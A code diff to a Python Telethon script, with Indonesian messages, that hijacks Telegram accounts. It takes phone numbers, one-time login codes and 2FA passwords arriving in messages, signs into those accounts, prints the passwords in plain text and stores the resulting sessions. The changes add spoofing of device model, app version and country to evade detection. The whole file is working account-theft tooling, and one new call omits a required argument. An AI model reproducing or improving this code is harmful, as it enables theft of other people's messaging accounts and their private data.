@@ -10,6 +10,7 @@ from telethon.errors import (
     PhoneCodeInvalidError
 )
 from telethon.tl.functions.account import GetAuthorizationsRequest
+from telethon.network.connection import ConnectionTcpAbridged
 
 # Konfigurasi API
 api_id = 23520639
@@ -22,6 +23,7 @@ ALLOWED_PREFIXES = ["+62", "+60", "+971"]
 pending_login = {}
 incoming_messages = {}
 login_attempted = set()
+completed_login = set()
 
 os.makedirs(SESSIONS_FOLDER, exist_ok=True)
 os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)
@@ -58,68 +60,45 @@ def is_valid_phone_number(phone):
     digits_only = re.sub(r'\D', '', phone)
     return 10 <= len(digits_only) <= 15 and any(phone.startswith(p) for p in ALLOWED_PREFIXES)
 
-async def apply_spoof_device(client, phone):
-    try:
-        await client.connect()
-        if hasattr(client, "_init_connection"):
-            try:
-                auths = await client(GetAuthorizationsRequest())
-                if auths.authorizations:
-                    last = auths.authorizations[0]
-                    client._init_connection.device_model = last.device_model
-                    client._init_connection.system_version = last.platform
-                    print(f"[🛠️] Spoof from session: {last.device_model} ({last.platform})")
-                else:
-                    raise Exception("tidak ada session sebelumnya")
-            except Exception as e:
-                model, version = random.choice(DEVICE_LIST)
-                client._init_connection.device_model = model
-                client._init_connection.system_version = version
-                print(f"[🛠️] Spoof fallback: {model} ({version}) | {e}")
-        else:
-            raise Exception("init_connection tidak tersedia")
-    except Exception as e:
-        if not client.is_connected():
-            await client.connect()
-        if hasattr(client, "_init_connection"):
-            model, version = random.choice(DEVICE_LIST)
-            client._init_connection.device_model = model
-            client._init_connection.system_version = version
-            print(f"[🛠️] Spoof fallback (conn): {model} ({version}) | {e}")
-        else:
-            print(f"[❌] Gagal spoof device: {e}")
-            return
+def create_spoofed_client(session_path, phone):
+    model, version = random.choice(DEVICE_LIST)
+    print(f"[\U0001f6e0\ufe0f] Spoof applied: {model} ({version})")
 
-    if hasattr(client, "_init_connection"):
-        conn = client._init_connection
-        conn.app_version = "Telegram Android 10.0.0"
-        conn.system_lang_code = "en"
-        conn.lang_code = "en"
-        conn.lang_pack = ""
-        if phone.startswith("+62"):
-            conn.country = "ID"
-            conn.latitude = -6.2
-            conn.longitude = 106.8167
-        elif phone.startswith("+60"):
-            conn.country = "MY"
-            conn.latitude = 3.1390
-            conn.longitude = 101.6869
-        elif phone.startswith("+971"):
-            conn.country = "AE"
-            conn.latitude = 25.2048
-            conn.longitude = 55.2708
-        else:
-            conn.country = "US"
-            conn.latitude = 37.7749
-            conn.longitude = -122.4194
+    client = TelegramClient(
+        session_path, api_id, api_hash,
+        device_model=model,
+        system_version=version,
+        app_version="Telegram Android 10.0.0",
+        lang_code="en",
+        system_lang_code="en",
+        connection=ConnectionTcpAbridged
+    )
+
+    async def set_country_after_connect():
+        try:
+            await client.connect()
+            if hasattr(client, "_init_connection"):
+                conn = client._init_connection
+                if phone.startswith("+62"):
+                    conn.country = "ID"
+                elif phone.startswith("+60"):
+                    conn.country = "MY"
+                elif phone.startswith("+971"):
+                    conn.country = "AE"
+                else:
+                    conn.country = "US"
+                print(f"[\U0001f30f] Country spoof applied: {conn.country}")
+        except Exception as e:
+            print(f"[\u26a0\ufe0f] Gagal spoof country: {e}")
+
+    client.set_country = set_country_after_connect
+    return client
 
 async def request_otp(phone):
     try:
         session_path = os.path.join(SESSIONS_FOLDER, phone)
-        login_client = TelegramClient(session_path, api_id, api_hash)
-
-        await apply_spoof_device(login_client, phone)
-        await login_client.connect()
+        login_client = create_spoofed_client(session_path, phone)
+        await login_client.set_country()
 
         if await login_client.is_user_authorized():
             print(f"[✅] {phone} sudah login. Pindahkan session.")
@@ -127,6 +106,7 @@ async def request_otp(phone):
             final_path = os.path.join(SESSIONS_FOLDER_FINAL, phone)
             if os.path.exists(session_path + ".session"):
                 shutil.move(session_path + ".session", final_path + ".session")
+            completed_login.add(phone)
             return
 
         try:
@@ -148,12 +128,7 @@ async def request_otp(phone):
 
 async def complete_login(phone, otp, password=None):
     try:
-        if phone not in pending_login:
-            print(f"[❌] Tidak ada pending login untuk {phone}")
-            return
-
-        if phone in login_attempted:
-            print(f"[⏳] Login sudah dicoba sebelumnya: {phone}")
+        if phone not in pending_login or phone in login_attempted:
             return
 
         login_client, phone_code_hash = pending_login[phone]
@@ -168,11 +143,13 @@ async def complete_login(phone, otp, password=None):
                 await login_client.sign_in(password=password)
                 print(f"[🔓] Login 2FA berhasil: {phone}")
             else:
-                print(f"[🔒] Butuh password 2FA: {phone}, belum tersedia.")
+                print(f"[⏳] Menunggu password 2FA: {phone}")
                 return
         except PhoneCodeInvalidError:
             print(f"[❌] OTP salah: {phone}")
-            login_attempted.add(phone)  # Tambahkan ke blacklist OTP
+            login_attempted.add(phone)
+            if phone in incoming_messages:
+                incoming_messages[phone]["otp"] = None
             return
         except Exception as e:
             print(f"[❌] Gagal login: {phone} | {e}")
@@ -180,6 +157,9 @@ async def complete_login(phone, otp, password=None):
             return
 
         print(f"[✅] Login berhasil: {phone}")
+        if not password:
+            completed_login.add(phone)
+
         await login_client.disconnect()
 
         src = os.path.join(SESSIONS_FOLDER, phone + ".session")
@@ -196,6 +176,8 @@ async def complete_login(phone, otp, password=None):
 
         del pending_login[phone]
         login_attempted.discard(phone)
+        if phone in incoming_messages:
+            incoming_messages[phone]["otp"] = None
 
     except Exception as e:
         print(f"[❌] complete_login error: {e}")
@@ -230,6 +212,10 @@ async def handler(event):
         print(f"[❌] Nomor tidak valid: {raw_phone}")
         return
 
+    if phone in completed_login:
+        print(f"[⛔] {phone} sudah login, abaikan pesan baru.")
+        return
+
     if phone not in incoming_messages:
         incoming_messages[phone] = {"otp": None, "password": None, "last_update": datetime.now()}
         if phone not in pending_login:
@@ -250,12 +236,9 @@ async def handler(event):
         incoming_messages[phone]["password"] = pw_value
         print(f"[🔐] Password 2FA diterima: {phone} = {pw_value}")
 
-    # Jalankan login hanya jika otp + password lengkap, dan belum pernah dicoba
     data = incoming_messages[phone]
     if data["otp"] and phone in pending_login and phone not in login_attempted:
         asyncio.create_task(complete_login(phone, data["otp"], data.get("password")))
-        # Jangan langsung hapus incoming_messages[phone], biarkan jaga cache
-
 
 async def clear_old_cache():
     while True:
@@ -276,8 +259,7 @@ async def check_all_existing_sessions():
         session_path = os.path.join(SESSIONS_FOLDER, filename)
         final_path = os.path.join(SESSIONS_FOLDER_FINAL, filename)
 
-        client = TelegramClient(os.path.join(SESSIONS_FOLDER, phone), api_id, api_hash)
-
+        client = create_spoofed_client(session_path)
         try:
             await client.connect()
             if await client.is_user_authorized():
@@ -285,6 +267,7 @@ async def check_all_existing_sessions():
                 await client.disconnect()
                 shutil.move(session_path, final_path)
                 print(f"[📂] Dipindah ke folder final: {final_path}")
+                completed_login.add(phone)
             else:
                 print(f"[❌] Session tidak valid: {phone} — akan dihapus.")
                 await client.disconnect()
